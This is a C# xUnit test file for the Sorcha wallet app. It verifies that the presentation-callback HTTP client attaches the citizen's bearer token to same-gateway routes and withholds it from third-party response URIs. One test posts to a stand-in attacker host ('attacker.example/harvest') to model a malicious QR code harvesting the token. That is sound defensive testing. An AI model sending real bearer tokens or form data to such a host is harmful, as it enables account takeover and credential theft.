// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Sorcha Contributors

using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Threading;
using System.Threading.Tasks;
using FluentAssertions;
using Microsoft.Extensions.DependencyInjection;
using Sorcha.Wallet.Pwa.Extensions;
using Sorcha.Wallet.Pwa.Services;
using Sorcha.Wallet.Pwa.Services.Presentation;
using Xunit;

namespace Sorcha.Wallet.Pwa.Tests.Extensions;

/// <summary>
/// #1310/#1311 — Present.razor's presentation-outcome POST previously went out on the ambient
/// <c>@inject HttpClient</c>, which the real <c>Program.cs</c> registers as a bare
/// <c>new HttpClient { BaseAddress = ... }</c> carrying NO bearer token. The sorcha-wallet
/// callback is <c>[Authorize(RequireConsumerAudience)]</c>, so every direct_post 401'd.
/// </summary>
/// <remarks>
/// This test exercises the REAL <see cref="ServiceCollectionExtensions.AddCitizenWalletServices"/>
/// registration end-to-end through <see cref="IHttpClientFactory"/> — not a hand-copied
/// reimplementation of it — so it would fail the moment someone removes
/// <c>.AddHttpMessageHandler&lt;BearerTokenHandler&gt;()</c> from the production
/// <c>IPresentationDirectPostClient</c> registration. A server-side test cannot catch this class
/// of bug: the integration harness authenticates every request unconditionally (see
/// <c>SorchaWalletExecuteIntegrationTests</c>/<c>BlueprintServiceWebApplicationFactory</c>'s
/// <c>TestAuthenticationHandler</c>), so an unauthenticated caller is indistinguishable from an
/// authenticated one there. This test instead inspects the PWA-side pipeline directly: it
/// captures the actual outbound <see cref="HttpRequestMessage"/> at the bottom of the DI-built
/// handler chain and asserts the bearer token the handler chain attached.
/// </remarks>
/// <remarks>
/// I1 follow-up (security regression introduced alongside #1310/#1311): the original version of
/// this test posted to an arbitrary <c>https://verifier.test/...</c> URI to stand in for "the
/// response_uri, whatever it is" — which meant it never noticed that <c>BearerTokenHandler</c>
/// attached the citizen's bearer token unconditionally, including to third-party destinations.
/// The <c>response_uri</c> for the <c>sorcha-wallet</c> consumer IS a same-gateway route (see
/// <see cref="PresentationDirectPostClient"/>'s own remarks), so the legitimate case posts back to
/// the registered gateway origin; a genuinely third-party <c>response_uri</c> (a scanned/pasted
/// <c>openid4vp://</c> request from any other verifier) must NOT receive the token. Both cases are
/// asserted below through the real DI-built handler chain.
/// </remarks>
public sealed class PresentationDirectPostClientRegistrationTests
{
    [Fact]
    public async Task PresentationDirectPostClient_ProductionRegistration_AttachesStoredBearerToken_ForSameOriginCallback()
    {
        // Arrange — build the SAME service collection Program.cs builds (AddCitizenWalletServices),
        // then swap only the two seams that would otherwise need a real browser (IJSRuntime-backed
        // IndexedDbAccessTokenStore) or the network (the typed client's primary handler).
        var services = new ServiceCollection();
        services.AddLogging();
        services.AddCitizenWalletServices("https://gw.test/");

        // Overriding AFTER AddCitizenWalletServices wins on resolution (DI returns the LAST
        // registration for a single-instance resolve) — no IJSRuntime ever touched. Reuses the
        // same InMemoryAccessTokenStore double AuthAndBearerTests.cs uses for BearerTokenHandler.
        var store = new InMemoryAccessTokenStore();
        await store.SetAsync(new AccessTokenRecord(
            "citizen-bearer-token", DateTimeOffset.UtcNow.AddHours(1), "citizen@test.example"));
        services.AddSingleton<IAccessTokenStore>(store);

        HttpRequestMessage? captured = null;
        var capturingHandler = new CapturingHandler(req =>
        {
            captured = req;
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK));
        });

        // Re-registering the SAME typed client name only ADDS a primary-handler override —
        // it does not remove the BearerTokenHandler/ServerClockHandler additional handlers the
        // production AddCitizenWalletServices call already wired onto this client.
        services.AddHttpClient<IPresentationDirectPostClient, PresentationDirectPostClient>()
            .ConfigurePrimaryHttpMessageHandler(() => capturingHandler);

        await using var provider = services.BuildServiceProvider();
        var client = provider.GetRequiredService<IPresentationDirectPostClient>();

        var form = new FormUrlEncodedContent(new Dictionary<string, string>
        {
            ["vp_token"] = """{"credential":["a~b~c"]}""",
            ["state"] = Guid.NewGuid().ToString(),
        });

        // Act — the sorcha-wallet callback's response_uri is a same-gateway route.
        await client.PostAsync("https://gw.test/api/presentations/callbacks/sorcha-wallet/abc", form);

        // Assert — this is exactly what BearerTokenHandler.SendAsync stamps (see
        // BearerTokenHandler.cs). If .AddHttpMessageHandler<BearerTokenHandler>() were removed
        // from the production registration, this header would be null and the assertion fails.
        captured.Should().NotBeNull("the request must reach the bottom of the DI-built handler chain");
        captured!.Headers.Authorization.Should().NotBeNull(
            "the sorcha-wallet callback requires RequireConsumerAudience — a direct_post with no " +
            "bearer token 401s before the endpoint's form-vs-json branch ever runs (#1310/#1311)");
        captured.Headers.Authorization.Should().BeEquivalentTo(
            new AuthenticationHeaderValue("Bearer", "citizen-bearer-token"));
    }

    [Fact]
    public async Task PresentationDirectPostClient_ProductionRegistration_OmitsBearerToken_ForThirdPartyResponseUri()
    {
        // I1 — a citizen can scan or paste an openid4vp:// request whose response_uri points
        // anywhere. Confirming Present.razor's OWN typed client (built through the real
        // production DI registration, not a stand-in) never leaks the bearer to it.
        var services = new ServiceCollection();
        services.AddLogging();
        services.AddCitizenWalletServices("https://gw.test/");

        var store = new InMemoryAccessTokenStore();
        await store.SetAsync(new AccessTokenRecord(
            "citizen-bearer-token", DateTimeOffset.UtcNow.AddHours(1), "citizen@test.example"));
        services.AddSingleton<IAccessTokenStore>(store);

        HttpRequestMessage? captured = null;
        var capturingHandler = new CapturingHandler(req =>
        {
            captured = req;
            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK));
        });

        services.AddHttpClient<IPresentationDirectPostClient, PresentationDirectPostClient>()
            .ConfigurePrimaryHttpMessageHandler(() => capturingHandler);

        await using var provider = services.BuildServiceProvider();
        var client = provider.GetRequiredService<IPresentationDirectPostClient>();

        var form = new FormUrlEncodedContent(new Dictionary<string, string>
        {
            ["vp_token"] = """{"credential":["a~b~c"]}""",
            ["state"] = Guid.NewGuid().ToString(),
        });

        // Act — a third-party verifier's response_uri, nothing to do with the Sorcha gateway.
        await client.PostAsync("https://attacker.example/harvest", form);

        // Assert
        captured.Should().NotBeNull("the request must reach the bottom of the DI-built handler chain");
        captured!.Headers.Authorization.Should().BeNull(
            "the citizen's bearer token must never be sent to a third-party response_uri — " +
            "a malicious QR must not be able to harvest it");
    }

    private sealed class CapturingHandler(Func<HttpRequestMessage, Task<HttpResponseMessage>> respond)
        : HttpMessageHandler
    {
        protected override Task<HttpResponseMessage> SendAsync(
            HttpRequestMessage request, CancellationToken cancellationToken)
            => respond(request);
    }
}
